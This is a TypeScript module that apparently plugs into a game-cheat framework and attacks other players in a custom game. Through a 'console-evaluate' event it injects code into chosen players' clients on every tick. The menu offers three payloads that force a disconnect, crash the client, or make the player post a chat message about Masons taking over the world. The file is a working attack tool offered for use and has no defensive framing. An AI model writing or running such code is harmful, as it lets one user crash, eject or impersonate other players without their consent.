import { PlayerResource, EventsSDK } from "wrapper/Imports"

var config = {
		payload_type: 0,
		crash_ids: [],
	},
	root_: Menu_Node,
	players: Menu_List

function SendCode(code: string) {
	GameEvents.FireEventToAllClients("console-evaluate", {
		code,
	})
}
function SendCodeFiltered(code: string) {
	SendCode(`if(${JSON.stringify(config.crash_ids)}[Players.GetLocalPlayer()])${code}`)
}

EventsSDK.on("GameStarted", () => {
	// loop-optimizer: KEEP
	players.values = PlayerResource.PlayerData.map(data => data.m_iszPlayerName)
	root_.Update()
	players.selected_flags = players.selected_flags.map(() => false) // reset state every game, as it's based on playerIDs
})
EventsSDK.on("GameEnded", () => {
	players.values = []
	root_.Update()
})

EventsSDK.on("Tick", () => {
	if (config.crash_ids.length === 0)
		return
	switch (config.payload_type) {
		case 1:
			SendCodeFiltered(`Game.ServerCmd("disconnect")`)
			break
		case 2:
			SendCodeFiltered(`[1].map(GameEvents.Subscribe)`)
			break
		case 3:
			SendCodeFiltered(`Game.ServerCmd("say МАССОНЫ ЗАХВАТЯТ ЭТОТ МИР")`)
			break
		default:
			break
	}
})

export default (my_root: Menu_Node, root: Menu_Node) => {
	root_ = root
	my_root.entries.push(new Menu_Combo (
		"Payload type",
		[
			"None",
			"Disconnect",
			"Crash",
			"MASSONS",
		],
		config.payload_type,
		self => config.payload_type = self.selected_id,
	))
	my_root.entries.push(players = new Menu_List (
		"Players",
		[],
		config.crash_ids,
		self => config.crash_ids = self.selected_flags,
	))
}
